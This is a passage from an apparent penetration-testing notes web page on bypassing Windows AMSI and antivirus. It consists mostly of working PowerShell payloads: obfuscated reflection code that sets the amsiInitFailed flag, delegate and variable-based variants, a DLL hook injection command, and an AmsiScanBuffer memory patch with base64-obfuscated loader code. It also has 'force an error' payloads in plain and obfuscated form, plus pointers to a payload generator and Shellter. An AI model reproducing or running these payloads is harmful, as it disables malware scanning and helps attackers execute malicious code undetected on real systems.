    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
</code></pre></div>    </div>
  </li>
  <li>Alternative Payload with the usage of variables:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$w</span> <span class="o">=</span> <span class="s1">'System.Management.Automation.A'</span>;<span class="nv">$c</span> <span class="o">=</span> <span class="s1">'si'</span>;<span class="nv">$m</span> <span class="o">=</span> <span class="s1">'Utils'</span>
<span class="nv">$assembly</span> <span class="o">=</span> <span class="o">[</span>Ref].Assembly.GetType<span class="o">((</span><span class="s1">'{0}m{1}{2}'</span> -f <span class="nv">$w</span>,<span class="nv">$c</span>,<span class="nv">$m</span><span class="o">))</span>
<span class="nv">$field</span> <span class="o">=</span> <span class="nv">$assembly</span>.GetField<span class="o">((</span><span class="s1">'am{0}InitFailed'</span> -f <span class="nv">$c</span><span class="o">)</span>,<span class="s1">'NonPublic,Static'</span><span class="o">)</span>
<span class="nv">$field</span>.SetValue<span class="o">(</span><span class="nv">$null</span>,<span class="nv">$true</span><span class="o">)</span>
</code></pre></div>    </div>
  </li>
  <li>Not detected by auto logging</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Delegate]::CreateDelegate<span class="o">((</span><span class="s2">"Func</span><span class="se">``</span><span class="s2">3[String, </span><span class="k">$((</span><span class="o">[</span><span class="kt">String</span><span class="o">]</span>.Assembly.GetType<span class="o">(</span><span class="s1">'System.Reflection.Bindin'</span><span class="o">+</span><span class="s1">'gFlags'</span><span class="k">))</span><span class="s2">.FullName), System.Reflection.FieldInfo]"</span>-as[String].Assembly.GetType<span class="o">(</span><span class="s1">'System.T'</span>+<span class="s1">'ype'</span><span class="o">))</span>,[Object]<span class="o">([</span>Ref].Assembly.GetType<span class="o">(</span><span class="s1">'System.Management.Automation.AmsiUtils'</span><span class="o">))</span>,<span class="o">(</span><span class="s1">'GetFie'</span>+<span class="s1">'ld'</span><span class="o">))</span>.Invoke<span class="o">(</span><span class="s1">'amsiInitFailed'</span>,<span class="o">((</span><span class="s1">'Non'</span>+<span class="s1">'Public,Static'</span><span class="o">)</span> -as[String].Assembly.GetType<span class="o">(</span><span class="s1">'System.Reflection.Bindin'</span>+<span class="s1">'gFlags'</span><span class="o">)))</span>.SetValue<span class="o">(</span><span class="nv">$null</span>,<span class="nv">$True</span><span class="o">)</span>
</code></pre></div></div>

<p>We can find more payloads on the following webpage:</p>

<ul>
  <li><a href="https://amsi.fail/">https://amsi.fail/</a></li>
</ul>

<h2 id="hooking">Hooking</h2>

<p>Exists a proof of concept of hokking into the <code class="highlighter-rouge">AmsiScanBuffer</code> function with a DLL. The <code class="highlighter-rouge">AmsiScanBuffer</code> function will be executed with dummy parameters.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\SimpleInjector.exe powershell.exe .\AmsiHook.dll
</code></pre></div></div>

<blockquote>
  <p><strong>Note</strong>: Not working because <code class="highlighter-rouge">AmsiHook.dll</code> is flagged by the AV.</p>
</blockquote>

<h2 id="memory-patching">Memory Patching</h2>

<p>Rasta-mouse released an <code class="highlighter-rouge">AMSI bypass</code> which patches the <code class="highlighter-rouge">AmsiScanBuffer()</code> function in order to return always <code class="highlighter-rouge">AMSI_RESULT_CLEAN</code>.</p>

<ul>
  <li>
    <p><a href="https://github.com/rasta-mouse/AmsiScanBufferBypass">https://github.com/rasta-mouse/AmsiScanBufferBypass</a></p>
  </li>
  <li>
    <p>Patch:</p>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static <span class="kt">byte</span><span class="o">[]</span> x64 <span class="o">=</span> new <span class="kt">byte</span><span class="o">[]</span> <span class="o">{</span> 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 <span class="o">}</span>;
</code></pre></div>    </div>
  </li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>System.Reflection.Assembly]::LoadFile<span class="o">(</span><span class="s2">"C:\Users\pentestlab\ASBBypass.dll"</span><span class="o">)</span>
<span class="o">[</span>Amsi]::Bypass<span class="o">()</span>
</code></pre></div></div>

<p>Obfuscating the powershell version of <code class="highlighter-rouge">ASBBypass</code> we can succesfully bypass the AMSI.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">_</span><span class="p">/==\_/\__/===\_/</span><span class="k">}</span> <span class="o">=</span> <span class="k">$(</span><span class="o">[</span>Text.Encoding]::Unicode.GetString<span class="o">([</span>Convert]::FromBase64String<span class="o">(</span><span class="s1">'dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA='</span><span class="k">)</span><span class="o">))</span>
<span class="nb">Add-Type</span> <span class="k">${</span><span class="nv">_</span><span class="p">/==\_/\__/===\_/</span><span class="k">}</span>
<span class="k">${</span><span class="nv">__</span><span class="p">/=\/==\/\_/=\_/</span><span class="k">}</span> <span class="o">=</span> <span class="o">[</span>Win32]::LoadLibrary<span class="o">(</span><span class="s2">"am"</span> + <span class="k">$(</span><span class="o">[</span>Text.Encoding]::Unicode.GetString<span class="o">([</span>Convert]::FromBase64String<span class="o">(</span><span class="s1">'cwBpAC4AZABsAGwA'</span><span class="k">)</span><span class="o">)))</span>
<span class="k">${</span><span class="nv">___</span><span class="p">/====\__/=====</span><span class="k">}</span> <span class="o">=</span> <span class="o">[</span>Win32]::GetProcAddress<span class="o">(</span><span class="k">${</span><span class="nv">__</span><span class="p">/=\/==\/\_/=\_/</span><span class="k">}</span>, <span class="k">$(</span><span class="o">[</span>Text.Encoding]::Unicode.GetString<span class="o">([</span>Convert]::FromBase64String<span class="o">(</span><span class="s1">'QQBtAHMAaQA='</span><span class="k">)</span><span class="o">))</span> + <span class="k">$(</span><span class="o">[</span>Text.Encoding]::Unicode.GetString<span class="o">([</span>Convert]::FromBase64String<span class="o">(</span><span class="s1">'UwBjAGEAbgA='</span><span class="k">)</span><span class="o">))</span> + <span class="k">$(</span><span class="o">[</span>Text.Encoding]::Unicode.GetString<span class="o">([</span>Convert]::FromBase64String<span class="o">(</span><span class="s1">'QgB1AGYAZgBlAHIA'</span><span class="k">)</span><span class="o">)))</span>
<span class="k">${</span><span class="p">/==\_/=\/\__/\/\/</span><span class="k">}</span> <span class="o">=</span> 0
<span class="o">[</span>Win32]::VirtualProtect<span class="o">(</span><span class="k">${</span><span class="nv">___</span><span class="p">/====\__/=====</span><span class="k">}</span>, <span class="o">[</span>uint32]5, 0x40, <span class="o">[</span>ref]<span class="k">${</span><span class="p">/==\_/=\/\__/\/\/</span><span class="k">}</span><span class="o">)</span>
<span class="k">${</span><span class="nv">_</span><span class="p">/\__/=\/\___/==\</span><span class="k">}</span> <span class="o">=</span> <span class="o">[</span><span class="kt">Byte</span><span class="o">[]]</span> <span class="o">(</span>0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3<span class="o">)</span>
<span class="o">[</span>System.Runtime.InteropServices.Marshal]::Copy<span class="o">(</span><span class="k">${</span><span class="nv">_</span><span class="p">/\__/=\/\___/==\</span><span class="k">}</span>, 0, <span class="k">${</span><span class="nv">___</span><span class="p">/====\__/=====</span><span class="k">}</span>, 6<span class="o">)</span>
</code></pre></div></div>

<h2 id="force-an-error">Force an Error</h2>

<p>Since there is a signature for the <code class="highlighter-rouge">amsiInitFailed</code> flag, an alterantive was discovered which attempt to force an error in order to set in a legitimate way the flag on true.</p>

<ul>
  <li>Original Payload:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$mem</span> <span class="o">=</span> <span class="o">[</span>System.Runtime.InteropServices.Marshal]::AllocHGlobal<span class="o">(</span>9076<span class="o">)</span>
<span class="o">[</span>Ref].Assembly.GetType<span class="o">(</span><span class="s2">"System.Management.Automation.AmsiUtils"</span><span class="o">)</span>.GetField<span class="o">(</span><span class="s2">"amsiContext"</span>,<span class="s2">"NonPublic,Static"</span><span class="o">)</span>.SetValue<span class="o">(</span><span class="nv">$null</span>, <span class="o">[</span>IntPtr]<span class="nv">$mem</span><span class="o">)</span>
<span class="o">[</span>Ref].Assembly.GetType<span class="o">(</span><span class="s2">"System.Management.Automation.AmsiUtils"</span><span class="o">)</span>.GetField<span class="o">(</span><span class="s2">"amsiSession"</span>,<span class="s2">"NonPublic,Static"</span><span class="o">)</span>.SetValue<span class="o">(</span><span class="nv">$null</span>, <span class="nv">$null</span><span class="o">)</span>;
</code></pre></div>    </div>
  </li>
  <li>Obfuscated Payload:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$fwi</span><span class="o">=[</span>System.Runtime.InteropServices.Marshal]::AllocHGlobal<span class="o">((</span>9076+8092-8092<span class="o">))</span>;<span class="o">[</span>Ref].Assembly.GetType<span class="o">(</span><span class="s2">"System.Management.Automation.</span><span class="k">$(</span><span class="o">[</span><span class="kt">cHAr</span><span class="o">](</span>65<span class="k">)</span><span class="s2">+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))"</span><span class="o">)</span>.GetField<span class="o">(</span><span class="s2">"</span><span class="k">$(</span><span class="s1">'àmsìSessîõn'</span>.NoRMALiZe<span class="o">([</span><span class="kt">char</span><span class="o">](</span>70+54-54<span class="k">)</span><span class="s2">+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))"</span>, <span class="s2">"NonPublic,Static"</span><span class="o">)</span>.SetValue<span class="o">(</span><span class="nv">$null</span>, <span class="nv">$null</span><span class="o">)</span>;<span class="o">[</span>Ref].Assembly.GetType<span class="o">(</span><span class="s2">"System.Management.Automation.</span><span class="k">$(</span><span class="o">[</span><span class="kt">cHAr</span><span class="o">](</span>65<span class="k">)</span><span class="s2">+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))"</span><span class="o">)</span>.GetField<span class="o">(</span><span class="s2">"</span><span class="k">$(</span><span class="o">[</span><span class="kt">char</span><span class="o">]([</span><span class="kt">bYtE</span><span class="o">]</span>0x61<span class="k">)</span><span class="s2">+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))"</span>, <span class="s2">"NonPublic,Static"</span><span class="o">)</span>.SetValue<span class="o">(</span><span class="nv">$null</span>, <span class="o">[</span>IntPtr]<span class="nv">$fwi</span><span class="o">)</span>;
</code></pre></div>    </div>
  </li>
</ul>

<h1 id="usage-of-syscallsopcodes-with-an-stager">Usage of syscalls/opcodes with an stager</h1>

<p>donut etc…
future content</p>

<h1 id="other-tools">Other Tools</h1>

<h2 id="shellter">Shellter</h2>

<p>Another way to bypass AV is using Shellter</p>

<p><img src="/hackingnotes/images/shellter.png" alt="Shellter" /></p>


			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
